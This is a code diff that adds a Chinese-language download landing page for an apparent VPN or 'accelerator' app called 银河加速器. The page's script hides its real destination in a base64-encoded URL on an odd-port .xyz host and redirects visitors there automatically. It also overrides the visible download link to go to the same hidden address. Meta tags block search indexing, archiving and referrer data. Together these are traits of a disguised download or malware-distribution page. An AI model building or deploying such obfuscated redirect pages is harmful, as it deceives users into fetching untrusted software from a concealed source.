@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  <link rel="canonical" href="https://dhqn.cn/">
+  <title>银河加速器(全球覆盖)官方网站</title>
+  <meta name="keywords" content="银河加速器,银河加速器下载,银河加速器官网">
+  <meta name="description" content="银河加速器是一款专注网络连接优化的工具，提供官网入口、版本下载与多端使用说明，支持线路切换和状态查看，适合办公、学习及日常访问需求。">
+  <link rel="icon" href="/favicon.ico">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body class="kexue-page">
+  <main class="redirect-card dhqn-govcn">
+    <h1>资源准备中</h1>
+    <p>正在校验连接环境</p>
+    <div class="countdown" id="countdown">3</div>
+    <div class="redirect-bar"><span></span></div>
+    <p>即将进入下载页面</p>
+    <a class="btn primary" id="manualDownload" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
+    <p class="download-note">如未自动跳转，请点击继续</p>
+  </main>
+  <script>
+  const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9iNTUuMzEzNDg2Lnh5ejozNTg4OC8=");
+  const manualDownload = document.getElementById("manualDownload");
+  const countdown = document.getElementById("countdown");
+  let seconds = 3;
+  const timer = window.setInterval(function () {
+    seconds -= 1;
+    countdown.textContent = seconds > 0 ? seconds : 0;
+    if (seconds <= 0) {
+      window.clearInterval(timer);
+      window.location.replace(REAL_DOWNLOAD_URL);
+    }
+  }, 1000);
+  manualDownload.addEventListener("click", function(e){
+  e.preventDefault();
+  window.location.replace(REAL_DOWNLOAD_URL);
+  });
+  </script>
+</body>
+</html>
